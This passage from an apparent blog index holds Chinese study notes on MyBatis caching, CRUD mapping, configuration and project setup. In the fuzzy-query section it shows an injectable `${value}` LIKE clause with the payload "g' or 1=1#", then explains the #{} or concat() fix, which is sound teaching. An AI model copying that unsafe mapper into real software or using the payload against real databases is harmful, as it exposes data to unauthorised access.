一级缓存，SqlSession级别的缓存，即本地缓存，默认开启。 二级缓存，需要手动开启和配置，基于namespace级别，定义了缓存接口Cache，可通过Cache自定义二级缓存。 一级缓存测试SqlSession一级缓存。 首先userMapper.java中创建一个接口 1user getUserById(@Param(&quot;id&quot;) int id); 在userMapper.xml中 12345&lt;mapper namespace&#x3D;&quot;com.ggy.dao.userMapper&quot;&gt; &lt;select id&#x3D;&quot;getUserById&quot; resultType&#x3D;&quot;user&quot;&gt; select * from mybatis.user where id&#x3D;#&#123;id&#125; &lt;&#x2F;select&gt;&lt;&#x2F;mapper&gt; 在Mybatis-config.xml中开启日志 123&lt;settings&gt; &lt;setting name&#x3D;&quot;logImpl&quot; value&#x3D;&quot;STDOUT_LOGGING&quot;&#x2F;&gt;&lt;&#x2F;settings&gt; test 12345678910@Testpublic void test()&#123; SqlSession session &#x3D; MybatisUtils.getSession(); userMapper mapper &#x3D; session.getMapper(userMapper.class); user userById &#x3D; mapper.getUserById(1); System.out.println(userById); user userById1 &#x3D; mapper.getUserById(1); System.out.println(userById1); session.close();&#125; 在一个SqlSession中查询一个数据两次，结果 可见，第二次查询并没有重新打开JDBC连接，而是直接在缓存中查找到的。 缓存失效1.查询不同的数据。 2.select查询会保存进缓存，insert, update, delete操作会刷新缓存。 增加接口 1int updateUser(user u); 实现接口 123&lt;update id&#x3D;&quot;updateUser&quot; parameterType&#x3D;&quot;user&quot;&gt; update mybatis.user set name&#x3D;#&#123;id&#125;,pwd&#x3D;#&#123;password&#125; where id&#x3D;#&#123;id&#125;;&lt;&#x2F;update&gt; 测试 1234567891011121314@Testpublic void test()&#123; SqlSession session &#x3D; MybatisUtils.getSession(); userMapper mapper &#x3D; session.getMapper(userMapper.class); user userById &#x3D; mapper.getUserById(1); System.out.println(userById); &#x2F;&#x2F;增加一个更新操作 mapper.updateUser(new user(2,&quot;ggy222&quot;,&quot;22xx&quot;)); user userById1 &#x3D; mapper.getUserById(1); System.out.println(userById1); session.close();&#125; 结果 可以发现，更新操作刷新了缓存，第二次查询需要重新查询数据库了。 3.查询不同的userMapper.xml 4.手动清除缓存 12345678910SqlSession session &#x3D; MybatisUtils.getSession();userMapper mapper &#x3D; session.getMapper(userMapper.class);user userById &#x3D; mapper.getUserById(1);System.out.println(userById);session.clearCache();user userById1 &#x3D; mapper.getUserById(1);System.out.println(userById1);session.close(); 使用session.clearCache()清除缓存。 二级缓存即全局缓存，需要手动开启。 Mybatis-config.xml 1234&lt;settings&gt; &lt;setting name&#x3D;&quot;logImpl&quot; value&#x3D;&quot;STDOUT_LOGGING&quot;&#x2F;&gt; &lt;setting name&#x3D;&quot;cacheEnabled&quot; value&#x3D;&quot;true&quot;&#x2F;&gt;&lt;&#x2F;settings&gt; 然后在userMapper.xml中，在同一个namespace中。 可以直接&lt;cache/&gt;, 也可以配置一些东西 1&lt;cache eviction&#x3D;&quot;FIFO&quot; flushInterval&#x3D;&quot;60000&quot; size&#x3D;&quot;512&quot; readOnly&#x3D;&quot;true&quot;&#x2F;&gt; 缓存刷新方式是FIFO先进先出，每隔60秒刷新，最多只能存512个数据，只读。 先使用配置了的cache测试 1234567891011121314@Testpublic void test()&#123; SqlSession session &#x3D; MybatisUtils.getSession(); SqlSession session2 &#x3D; MybatisUtils.getSession(); userMapper mapper &#x3D; session.getMapper(userMapper.class); user userById &#x3D; mapper.getUserById(1); System.out.println(userById); session.close(); userMapper mapper2 &#x3D; session2.getMapper(userMapper.class); user userById1 &#x3D; mapper2.getUserById(1); System.out.println(userById1); session2.close();&#125; 工作机制 查一条数据，存到一级缓存，关闭后，一级缓存没了，但是存到了二级缓存。 session关闭后，再使用session2查询同样的数据，会在二级缓存查找。 只使用&lt;cache/&gt;会报序列化的错误 org.apache.ibatis.cache.CacheException: Error serializing object. Cause: java.io.NotSerializableException: com.ggy.pojo.user 到user类中 1public class user implements Serializable&#123;&#125; 实现序列化类即可。","categories":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Mybatis学习3","slug":"Mybatis学习3","permalink":"https://ggyggy666.github.io/tags/Mybatis%E5%AD%A6%E4%B9%A03/"}],"keywords":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}]},{"title":"Mybatis学习2","slug":"Mybatis学习2","date":"2021-06-08T02:14:17.000Z","updated":"2021-06-09T03:35:13.932Z","comments":true,"path":"2021/06/08/Mybatis学习2/","link":"","permalink":"https://ggyggy666.github.io/2021/06/08/Mybatis%E5%AD%A6%E4%B9%A02/","excerpt":"今天继续学习Mybatis。","text":"今天继续学习Mybatis。 通常情况下，Mybatis中连接数据库的类名都用的是mapper而不是dao了。因此首先把昨天写的userDao改成userMapper。之后还需要修改一些相关联的东西。 userDao修改成userMappermybatis-config.xml配置文件是配置了连接数据库的，不用改；utils包的MybatisUtils是获取连接数据库的一个sqlSession的，不用改；pojo中的user实体类是对应数据库表的字段值的，也不要改；因此只需要改dao层的接口和xml文件。 命名空间：在userMapper.xml中，命名空间是绑定接口类userMapper的。 1234567&lt;mapper namespace&#x3D;&quot;com.ggy.dao.userMapper&quot;&gt;&lt;!--SQL语句，userDao中的方法名唯一标识，返回类型是userDao中的方法的类型--&gt;&lt;select id&#x3D;&quot;getUserList&quot; resultType&#x3D;&quot;com.ggy.pojo.user&quot;&gt; select * from mybatis.user; &lt;&#x2F;select&gt;&lt;&#x2F;mapper&gt; select标签代码查询语句，id对应接口类中的getUserList函数，resultType是执行SQL语句后返回的类型，还有之后用到的parameterType是参数类型（Class, Integer, String这些）。 test目录下的测试类也要改 12userMapper usermapper &#x3D; session.getMapper(com.ggy.dao.userMapper.class);List&lt;user&gt; userList &#x3D; usermapper.getUserList(); CRUD增删改查操作。 查询1.首先在userMapper接口类中增加一个接口，该接口可以通过传进来一个id值查询出对应的一行数据，返回类型自然是user 1user getUserById(int id); 2.在userMapper.xml中绑定这个接口，并增加查询语句。 1234&lt;!--通过id查询用户--&gt;&lt;select id&#x3D;&quot;getUserById&quot; resultType&#x3D;&quot;com.ggy.pojo.user&quot; parameterType&#x3D;&quot;int&quot;&gt; select * from mybatis.user where id &#x3D; #&#123;id&#125;;&lt;&#x2F;select&gt; 因为先前已经有命名空间绑定了userMapper接口了，这里只需要增加select语句。 3.在userMapperTest增加一个测试函数。 12345678@Testpublic void getUserByIdTest()&#123; SqlSession sqlSession &#x3D; MybatisUtils.getSession(); userMapper mapper &#x3D; sqlSession.getMapper(userMapper.class); user userById &#x3D; mapper.getUserById(1); System.out.println(userById); sqlSession.close();&#125; 获取sqlSession后，使用getMapper函数获得一个mapper对象，然后再去调用这个对象里面的getUserById接口，并传一个id值1进去获得返回的user，然后输出。最后记得要使用sqlSession.close关闭！ 插入1.首先在userMapper接口类中增加一个接口，该接口可以通过传入一个user类进行插入数据。 1int insertData(user User); 2.在userMapper.xml中绑定这个接口，并增加插入语句。 1234&lt;!--插入数据--&gt;&lt;insert id&#x3D;&quot;insertData&quot; parameterType&#x3D;&quot;com.ggy.pojo.user&quot;&gt; insert into user(id, name, pwd) values (#&#123;id&#125;, #&#123;name&#125;, #&#123;pwd&#125;);&lt;&#x2F;insert&gt; 注意，因为要用到预编译，所以#{id},#[name],#{pwd}的名字需要与user类中的三个属性名称一致。 3.在userMapperTest增加一个测试函数。 1234567891011@Testpublic void insertData()&#123; SqlSession sqlSession &#x3D; MybatisUtils.getSession(); userMapper mapper &#x3D; sqlSession.getMapper(userMapper.class); int res &#x3D; mapper.insertData(new user(4, &quot;ggy4&quot;, &quot;444&quot;)); if(res&gt;0)&#123; System.out.println(&quot;Insert Success!&quot;); &#125; sqlSession.commit(); sqlSession.close();&#125; 注意，插入的返回值是一个整数，不为0说明插入成功。而且增删改操作需要提交事务！使用 1sqlSession.commit(); 更新同理插入。 12&#x2F;&#x2F;userMapper.javaint updateUser(user User); 12345&#x2F;&#x2F;userMapper.xml&lt;!--更新数据--&gt;&lt;update id&#x3D;&quot;updateUser&quot; parameterType&#x3D;&quot;com.ggy.pojo.user&quot;&gt; update mybatis.user set name&#x3D;#&#123;name&#125;, pwd&#x3D;#&#123;pwd&#125; where id&#x3D;#&#123;id&#125;;&lt;&#x2F;update&gt; 123456789101112&#x2F;&#x2F;userMapperTest.java@Testpublic void updateData()&#123; SqlSession sqlSession &#x3D; MybatisUtils.getSession(); userMapper mapper &#x3D; sqlSession.getMapper(userMapper.class); int res &#x3D; mapper.updateUser(new user(4, &quot;ggy444&quot;, &quot;44&quot;)); if(res&gt;0)&#123; System.out.println(&quot;Update Success!&quot;); &#125; sqlSession.commit(); sqlSession.close();&#125; 删除12&#x2F;&#x2F;userMapper.javaint deleteUser(int id); 12345&#x2F;&#x2F;userMapper.xml&lt;!--删除数据--&gt;&lt;delete id&#x3D;&quot;deleteUser&quot; parameterType&#x3D;&quot;int&quot;&gt; delete from mybatis.user where id&#x3D;#&#123;id&#125;;&lt;&#x2F;delete&gt; 12345678910&#x2F;&#x2F;userMapperTest.java@Testpublic void deleteData()&#123; SqlSession session &#x3D; MybatisUtils.getSession(); userMapper mapper &#x3D; session.getMapper(userMapper.class); int i &#x3D; mapper.deleteUser(4); if(i&gt;0)System.out.println(&quot;Delete Success!&quot;); session.commit(); session.close();&#125; Map使用和模糊查询Map使用像之前的插入，传入的是user类，在传入类时必须要初始化，而new时又必须知道这个类有多少参数，也就是说需要知道数据库的表的所有字段，并且SQL语句预编译时使用的必须参数名必须跟字段名一致，即： 1insert into user(id, name, pwd) values (#&#123;id&#125;, #&#123;name&#125;, #&#123;pwd&#125;); 如果字段非常多，但是我们又只想插入某几个字段而已，这时候就显得非常累赘麻烦了。如果使用map就不一样了。需要添加什么字段，就可以将其保存到map中，使用键值对的方式，在SQL语句预编译时使用map的键即可。 1int insertData1(Map&lt;String, Object&gt; map); 1234&lt;!--使用Map插入数据--&gt;&lt;insert id&#x3D;&quot;insertData1&quot; parameterType&#x3D;&quot;map&quot;&gt; insert into user(id, pwd) values (#&#123;id&#125;, #&#123;password&#125;);&lt;&#x2F;insert&gt; 123456789101112@Testpublic void insertData1()&#123; SqlSession session &#x3D; MybatisUtils.getSession(); userMapper mapper &#x3D; session.getMapper(userMapper.class); Map&lt;String, Object&gt; map &#x3D; new HashMap&lt;String, Object&gt;(); map.put(&quot;id&quot;, 5); map.put(&quot;password&quot;, &quot;ggy555&quot;); int i &#x3D; mapper.insertData1(map); if(i&gt;0)System.out.println(&quot;插入成功！&quot;); session.commit(); session.close();&#125; 模糊查询使用like查询。可能会返回多个user，因此 1List&lt;user&gt; getUserByLike(String value); 1234&lt;!--通过value模糊查询用户--&gt;&lt;select id&#x3D;&quot;getUserByLike&quot; resultType&#x3D;&quot;com.ggy.pojo.user&quot;&gt; select * from mybatis.user where name like #&#123;value&#125;;&lt;&#x2F;select&gt; 这个value与接口传进来的参数名是一致的。因为这个xml里的select配置是接口的实现。 12345678910@Testpublic void getUserByLike()&#123; SqlSession sqlSession &#x3D; MybatisUtils.getSession(); userMapper mapper &#x3D; sqlSession.getMapper(userMapper.class); List&lt;user&gt; userByLike &#x3D; mapper.getUserByLike(&quot;%g%&quot;); for(user user1:userByLike)&#123; System.out.println(user1); &#125; sqlSession.close();&#125; 模糊查询需要有%, 如果把%都去掉，就查不到数据了。但是有一种情况，就是SQL语句中有%, 然后传进来的值与%进行拼接（使用的是$)之后再执行，这样会造成SQL注入。 userMapper.xml中 1234&lt;!--通过value模糊查询用户--&gt;&lt;select id&#x3D;&quot;getUserByLike&quot; resultType&#x3D;&quot;com.ggy.pojo.user&quot;&gt; select * from mybatis.user where name like &#39;%$&#123;value&#125;%&#39;;&lt;&#x2F;select&gt; userMapperTest.java的getUserByLike函数中 1List&lt;user&gt; userByLike &#x3D; mapper.getUserByLike(&quot;g&#39; or 1&#x3D;1#&quot;); 这样会造成SQL注入。 #{id}这样是做了预编译，${id}这样没有做预编译，直接就拼接了。 防御：&quot;%&quot;#{id}&quot;%&quot;或者concat(&quot;%&quot;, #{id}, &quot;%&quot;) 配置解析配置文件mybatis-config.xml中有很多配置，需要掌握的配置如下： 环境配置environments中可以配置多个环境，但是每个sqlSession只能使用一个环境，使用default属性来配置默认的环境，比如： 默认的环境就是test环境了。 注意transactionManager这个标签，事务管理器，Mybatis有两个事务管理器：JDBC和MANAGED，默认是JDBC。 dataSource是数据源标签，有三种类型：UNPOOLED, POOLED和JNDI。 UNPOOLED，非连接池，每一次连接数据库都要请求，用完后就关闭数据库的连接。 POOLED，连接池，连接数据库后不关闭，可以让web应用快速响应请求。 JNDI，在其它应用服务器中配置数据源，然后JNDI方式导入。 属性properties配置。在一个db.properties文件中定义好一些配置，然后通过properties标签引入进来，之后的environment环境中的dataSource中的属性就不用写死了，只需要${}就行了。 新建一个db.properties 1234driver&#x3D;com.mysql.cj.jdbc.Driverurl&#x3D;jdbc:mysql:&#x2F;&#x2F;192.168.1.105:3306&#x2F;mybatis?useSSL&#x3D;false&amp;serverTimezone&#x3D;GMT%2B8&amp;useUnicode&#x3D;true&amp;characterEncoding&#x3D;UTF-8username&#x3D;rootpassword&#x3D;root url中用的是&amp;了，不是&amp;amp;了。 然后在Mybatis-config.xml中导入，并将属性值换成动态 1234567891011&lt;properties resource&#x3D;&quot;db.properties&quot;&#x2F;&gt;&lt;environments default&#x3D;&quot;development&quot;&gt; &lt;environment id&#x3D;&quot;development&quot;&gt; &lt;transactionManager type&#x3D;&quot;JDBC&quot;&#x2F;&gt; &lt;dataSource type&#x3D;&quot;POOLED&quot;&gt; &lt;property name&#x3D;&quot;driver&quot; value&#x3D;&quot;$&#123;driver&#125;&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;url&quot; value&#x3D;&quot;$&#123;url&#125;&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;username&quot; value&#x3D;&quot;$&#123;username&#125;&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;password&quot; value&#x3D;&quot;$&#123;password&#125;&quot;&#x2F;&gt; &lt;&#x2F;dataSource&gt; &lt;&#x2F;environment&gt; 注意properties标签必须在最开头。有顺序的。 还有一种写法，在db.properties中不写username和password，然后在properties标签中加两个property。 1234&lt;properties resource&#x3D;&quot;db.properties&quot;&gt; &lt;property name&#x3D;&quot;username&quot; value&#x3D;&quot;root&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;password&quot; value&#x3D;&quot;root&quot;&#x2F;&gt;&lt;&#x2F;properties&gt; 不过需要注意，这种引入的property优先级低于外部db.properties文件中的属性。即如果这个property标签中的密码是123456，而db.properties中也有一个password，密码是root，这样还是能连接数据库的，因为优先级是获取外部文件中的值。反之就不行了。 类型别名typeAliases, 可以为一个类型设置短的别名，可以减少类完全限定名的冗余。顺序是在配置中的第三个标签。有三种方法设置别名。 1.使用typeAlias 123&lt;typeAliases&gt; &lt;typeAlias type&#x3D;&quot;com.ggy.pojo.user&quot; alias&#x3D;&quot;user&quot;&#x2F;&gt;&lt;&#x2F;typeAliases&gt; 然后usermapper.xml中，类型就可以直接使用user了。 123&lt;select id&#x3D;&quot;getUserList&quot; resultType&#x3D;&quot;user&quot;&gt; select * from mybatis.user; &lt;&#x2F;select&gt; 2.使用package 123&lt;typeAliases&gt; &lt;package name&#x3D;&quot;com.ggy.pojo&quot;&#x2F;&gt;&lt;&#x2F;typeAliases&gt; usermapper.xml中类型也是直接使用user，然后会在这个包下扫描得到user类。 3.使用注解，可以在user这个实体类开头加一句注解 1@Alias(&quot;user&quot;) 设置设置有很多项，目前需要记住的有： 日志实现 开启缓存和延迟加载 其它配置 映射器mappers，之前就有用到，需要注册userMapper.xml文件资源。 1.使用resource指定文件 123&lt;mappers&gt; &lt;mapper resource&#x3D;&quot;com&#x2F;ggy&#x2F;dao&#x2F;userMapper.xml&quot;&#x2F;&gt;&lt;&#x2F;mappers&gt; 2.使用class指定xml文件对应的类 123&lt;mappers&gt; &lt;mapper class&#x3D;&quot;com.ggy.dao.userMapper&quot;&#x2F;&gt;&lt;&#x2F;mappers&gt; 需要注意：接口类名称与对应的xml文件名称一致，并且都在同一个包下。 3.使用package指定包 123&lt;mappers&gt; &lt;package name&#x3D;&quot;com.ggy.dao&quot;&#x2F;&gt;&lt;&#x2F;mappers&gt; 需要注意：接口类名称与对应的xml文件名称一致，并且都在同一个包下。 生命周期和作用域生命周期和作用域是至关重要的，一旦滥用，会导致严重的并发问题。 SqlSessionFactoryBuilder, 一旦创建，就不再需要了，是个局部变量。 SqlSessionFactory，可以理解为数据库连接池，一旦被创建，应用运行期间就一直存在，没有理由丢弃或者创建另一个实例，全局作用域。最简单就是使用单例模式或者静态单例模式，即只创建一个SqlSessionFactory即可。 SqlSession，连接到连接池的一个请求，它的实例不是线程安全的无法被共享，最好是请求域方法作用域，用完后赶紧关闭。 可见，一个SqlSessionFactory可以创建多个SqlSession, 每一个SqlSession又能创建多个Mapper，每一个Mapper代表一种业务。 resultMap的使用解决属性名和字段名不一致的问题 问题首先新建一个项目，将之前的类、资源等全都复制过来。需要注意的是，不能直接将包和类一块复制过来。需要先创建com.ggy包后，只复制dao,pojo,utils包或者资源文件。 创建完成后，到user类中，将pwd全部替换成password。然后测试 12345678910@Testpublic void test()&#123; &#x2F;&#x2F;获取sqlSession对象 SqlSession session &#x3D; MybatisUtils.getSession(); userMapper usermapper &#x3D; session.getMapper(userMapper.class); user user &#x3D; usermapper.getUserById(1); System.out.println(user); session.close();&#125; 结果如下： 1user&#123;id&#x3D;1, name&#x3D;&#39;ggy1&#39;, password&#x3D;&#39;null&#39;&#125; 可以发现password是null值。因为输出的是user类中的id,name,password三个值，而数据库查询不到password，因此返回null值。 解决方法： 1.别名：将SQL语句更改为： 1select id,name,pwd as password from mybatis.user where id &#x3D; #&#123;id&#125;; 2.使用resultMap。 使用resultMap数据库中字段是pwd,类的属性是password，那么只需要对它们做一个映射即可。 SQL语句修改回来 1select * from mybatis.user where id &#x3D; #&#123;id&#125;; 然后去掉resultType，使用resultMap 123&lt;select id&#x3D;&quot;getUserById&quot; resultMap&#x3D;&quot;map&quot; parameterType&#x3D;&quot;int&quot;&gt; select * from mybatis.user where id &#x3D; #&#123;id&#125;;&lt;&#x2F;select&gt; 然后增加一个resultMap标签，注意顺序，这个标签在select标签上。 123&lt;resultMap id&#x3D;&quot;map&quot; type&#x3D;&quot;com.ggy.pojo.user&quot;&gt; &lt;result column&#x3D;&quot;pwd&quot; property&#x3D;&quot;password&quot;&#x2F;&gt;&lt;&#x2F;resultMap&gt; 这个id的值map应与select标签中的resultMap的值map一致。column表示数据库表的字段名，property表示user类的属性。这样映射即可。 总结创建一个使用Mybatis的项目，步骤： 首先建立一个Maven项目，在pom.xml中将mysql, junit, mybatis这些依赖都装上。 然后新建一个模块，确保连接上数据库。 接着在resources目录下创建一个mybaits-config.xml配置文件并编写需要的配置。 编写一个utils工具类，使得可以通过mybatis-config.xml建立一个SqlSessionFactory并创建出返回SqlSession对象。 编写一个pojo的实体类，其属性对应数据库表的所有字段。 编写dao层，创建一个类接口，然后创建mapper.xml去实现它。 最后创建测试类，去测试。","categories":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Mybatis学习2","slug":"Mybatis学习2","permalink":"https://ggyggy666.github.io/tags/Mybatis%E5%AD%A6%E4%B9%A02/"}],"keywords":[{"name":"ssm学习","slug":"ssm学习","permalink":"https://ggyggy666.github.io/categories/ssm%E5%AD%A6%E4%B9%A0/"}]},{"title":"Mybatis学习1","slug":"Mybatis学习1","date":"2021-06-07T07:35:42.000Z","updated":"2021-06-08T02:19:57.284Z","comments":true,"path":"2021/06/07/Mybatis学习1/","link":"","permalink":"https://ggyggy666.github.io/2021/06/07/Mybatis%E5%AD%A6%E4%B9%A01/","excerpt":"今天把Maven大概学习完了，知道了怎么创建项目、配置环境、打包项目和部署项目。接下来学习Mybatis。","text":"今天把Maven大概学习完了，知道了怎么创建项目、配置环境、打包项目和部署项目。接下来学习Mybatis。 Mybatis简介用来操作数据库的，原来的JDBC代码太复杂了。 持久化：将程序的数据在持久状态和瞬时状态转化的过程。因为内存中的数据是断电即失。 Maven仓库 123456&lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;org.mybatis&#x2F;mybatis --&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mybatis&lt;&#x2F;artifactId&gt; &lt;version&gt;3.5.6&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; Github https://github.com/mybatis/mybatis-3/releases 中文文档 https://mybatis.org/mybatis-3/zh/getting-started.html 英文文档 https://mybatis.org/mybatis-3/getting-started.html Mybatis环境搭建创建数据库打开Phpstudy_pro, 打开Mysql8.0.12, 然后连接数据库 1234567891011mysql -uroot -p rootcreate database mybatis;use mybatis;create table &#96;user&#96;(&#96;id&#96; INT(20) not null primary key,&#96;name&#96; varchar(30) default null,&#96;pwd&#96; varchar(30) default null);insert into &#96;user&#96;(&#96;id&#96;, &#96;name&#96;, &#96;pwd&#96;) values (1,&#39;ggy1&#39;,&#39;111&#39;),(2,&#39;ggy2&#39;,&#39;222&#39;),(3,&#39;ggy3&#39;,&#39;333&#39;); 创建Maven项目新建一个普通的Maven项目（不用勾选），然后把src目录删了 之后在Pom.xml中将MySQL、mybatis和junit依赖导入 12345678910111213141516171819&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt; &lt;version&gt;8.0.12&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mybatis&lt;&#x2F;artifactId&gt; &lt;version&gt;3.5.6&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;&#x2F;groupId&gt; &lt;artifactId&gt;junit&lt;&#x2F;artifactId&gt; &lt;version&gt;4.12&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt; 创建一个模块在项目下创建一个模块，这样就能保持一个父子依赖关系。只要在父项目中配置了MySQL和mybatis等依赖，其它子模块就不用再重新导入了。 直接new一个Mybatis_01模块。然后需要Mybatis的配置文件：https://mybatis.org/mybatis-3/getting-started.html。 在src的main的resources目录下新建一个Mybatis-config.xml 1234567891011121314151617&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE configuration PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Config 3.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt; &lt;environments default&#x3D;&quot;development&quot;&gt; &lt;environment id&#x3D;&quot;development&quot;&gt; &lt;transactionManager type&#x3D;&quot;JDBC&quot;&#x2F;&gt; &lt;dataSource type&#x3D;&quot;POOLED&quot;&gt; &lt;property name&#x3D;&quot;driver&quot; value&#x3D;&quot;$&#123;driver&#125;&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;url&quot; value&#x3D;&quot;$&#123;url&#125;&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;username&quot; value&#x3D;&quot;$&#123;username&#125;&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;password&quot; value&#x3D;&quot;$&#123;password&#125;&quot;&#x2F;&gt; &lt;&#x2F;dataSource&gt; &lt;&#x2F;environment&gt; &lt;&#x2F;environments&gt;&lt;&#x2F;configuration&gt; 但是可以看到有四个property, 需要获得它们的值并覆盖。其中，driver是com.mysql.jdbc.driver。而URL就需要连接数据库了。 IDEA连接MySQL 下载好驱动后，输入用户名和密码连接，发现出错了 什么时区属性没有设置。按照文章解决：https://blog.csdn.net/liuqiker/article/details/102455077，Mysql命令行中输入：`set global time_zone = ‘+8:00’;`即可。 连接成功。然后连接Mybatis数据库 连接上后，得到url: jdbc:mysql://localhost:3306, 但是这个还不完整。完整如下： 1jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;mybatis?useSSL&#x3D;true&amp;useUnicode&#x3D;true&amp;characterEncoding&#x3D;UTF-8 这是为了防止有其它错误。再填写上用户名和密码，最终如下： 12345678910111213&lt;configuration&gt; &lt;environments default&#x3D;&quot;development&quot;&gt; &lt;environment id&#x3D;&quot;development&quot;&gt; &lt;transactionManager type&#x3D;&quot;JDBC&quot;&#x2F;&gt; &lt;dataSource type&#x3D;&quot;POOLED&quot;&gt; &lt;property name&#x3D;&quot;driver&quot; value&#x3D;&quot;com.mysql.jdbc.Driver&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;url&quot; value&#x3D;&quot;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;mybatis?useSSL&#x3D;true&amp;useUnicode&#x3D;true&amp;characterEncoding&#x3D;UTF-8&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;username&quot; value&#x3D;&quot;root&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;password&quot; value&#x3D;&quot;root&quot;&#x2F;&gt; &lt;&#x2F;dataSource&gt; &lt;&#x2F;environment&gt; &lt;&#x2F;environments&gt;&lt;&#x2F;configuration&gt; 编写连接工具类连接上Mysql后，需要一个工具类去操作Mysql，执行SQL语句。 创建MybatisUtils这个类用来返回一个sqlSession。 在java目录下创建com.ggy包，再创建dao包和utils包，在utils包下创建MybatisUtils类 1234567891011public class MybatisUtils &#123; static &#123; try &#123; String resource &#x3D; &quot;mybatis-config.xml&quot;; InputStream inputStream &#x3D; Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory &#x3D; new SqlSessionFactoryBuilder().build(inputStream); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 那三句话就是用来创建SqlSessionFactory的。创建这个工厂后就可以通过openSession()返回一个SqlSession对象。 123public static SqlSession getSession()&#123; return sqlSessionFactory.openSession();&#125; 它是静态的方法，调用的应该也是静态的sqlSessionFactory才行，因此上面也要改。最终如下： 之后就能调用这个类的getSession方法获得一个sqlSession对象了。 创建实体类pojo在com.ggy包下新建一个pojo包，然后创建一个user类 这个类包含user表的三个属性，id，name和pwd。然后生成有参和无参的构造函数，生成Getter and Setter，还有toString方法。 创建userDao接口和userMapper.xml在dao包下创建userDao类 这个类就是一个接口。之后本应该创建一个实现类，但是，常用的实现类是userDaoImpl，这样写的话最终还是使用JDBC去连接，违背了使用Mybatis的初衷。因此，这里创建的是userMapper.xml文件。 123456789101112&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Mapper 3.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-mapper.dtd&quot;&gt;&lt;!--与userDao绑定，通过命名空间, 表示实现userDao--&gt;&lt;mapper namespace&#x3D;&quot;com.ggy.dao.userDao&quot;&gt; &lt;!--SQL语句，id是userDao中的方法名唯一标识，返回类型是userDao中的方法的类型--&gt; &lt;select id&#x3D;&quot;getUserList&quot; resultType&#x3D;&quot;com.ggy.pojo.user&quot;&gt; select * from mybatis.user; &lt;&#x2F;select&gt;&lt;&#x2F;mapper&gt; 返回一个值就是resultType, 多个就得用resultMap。 测试在test的Java的目录下新建一个com.ggy.dao, 再创建userDaoTest类 12345678910111213141516171819public class userDaoTest &#123; @Test public void test()&#123; &#x2F;&#x2F;获取sqlSession对象 SqlSession session &#x3D; MybatisUtils.getSession(); &#x2F;&#x2F;方式一：getMapper userDao userDao &#x3D; session.getMapper(com.ggy.dao.userDao.class); List&lt;user&gt; userList &#x3D; userDao.getUserList(); &#x2F;&#x2F;方式二 &#x2F;&#x2F;List&lt;user&gt; userList &#x3D; session.selectList(&quot;com.ggy.dao.userDao.getUserList&quot;); for(user user: userList)&#123; System.out.println(user); &#125; session.close(); &#125;&#125; 这样运行的话会出错： 1org.apache.ibatis.binding.BindingException: Type interface com.ggy.dao.userDao is not known to the MapperRegistry. 因为每一个Mapper.xml都需要在Mybatis-config.xml中注册 在Mybatis-config.xml中 123&lt;mappers&gt; &lt;mapper resource&#x3D;&quot;com&#x2F;ggy&#x2F;dao&#x2F;userMapper.xml&quot;&#x2F;&gt;&lt;&#x2F;mappers&gt; 但是还是错了。因为这个Mapper.xml是在src下的，而现在是运行test目录下的程序，因此找不到userMapper.xml。当然，如果直接复制过来也是可以的，只不过显然臃肿。 Maven中约定大于配置，所以需要在pom.xml中的build标签下配置resource，来防止资源导出失败的问题。 12345678910111213141516171819&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src&#x2F;main&#x2F;resources&lt;&#x2F;directory&gt; &lt;includes&gt; &lt;include&gt;**&#x2F;*.properties&lt;&#x2F;include&gt; &lt;include&gt;**&#x2F;*.xml&lt;&#x2F;include&gt; &lt;&#x2F;includes&gt; &lt;&#x2F;resource&gt; &lt;resource&gt; &lt;directory&gt;src&#x2F;main&#x2F;java&lt;&#x2F;directory&gt; &lt;includes&gt; &lt;include&gt;**&#x2F;*.properties&lt;&#x2F;include&gt; &lt;include&gt;**&#x2F;*.xml&lt;&#x2F;include&gt; &lt;&#x2F;includes&gt; &lt;filtering&gt;true&lt;&#x2F;filtering&gt; &lt;&#x2F;resource&gt; 